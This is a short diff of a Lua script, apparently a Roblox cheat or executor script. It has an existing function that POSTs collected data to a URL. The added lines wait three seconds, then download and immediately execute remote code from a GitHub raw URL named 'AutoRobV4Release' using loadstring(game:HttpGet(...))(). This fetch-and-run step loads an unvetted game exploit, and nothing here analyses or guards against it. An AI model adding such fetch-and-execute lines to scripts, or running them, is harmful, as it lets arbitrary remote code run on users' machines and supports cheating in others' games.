@@ -103,3 +103,7 @@ local data =
     local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
     http_request(request_payload)
 end
+--task-1
+task.wait(3)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/AutoRobV4Release"))()
